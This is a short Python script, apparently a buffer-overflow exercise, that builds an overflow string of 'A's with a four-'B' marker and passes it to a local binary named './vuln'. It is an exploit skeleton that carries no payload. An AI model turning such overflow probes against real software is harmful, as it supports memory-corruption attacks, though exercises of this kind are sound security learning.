#!/usr/bin/env python

import struct
from subprocess import call

buf = "A" * 60 #172
buf += "B" * 4
buf += "A" * 192 #80


print("Calling vulnerable program")
call(["./vuln", buf])
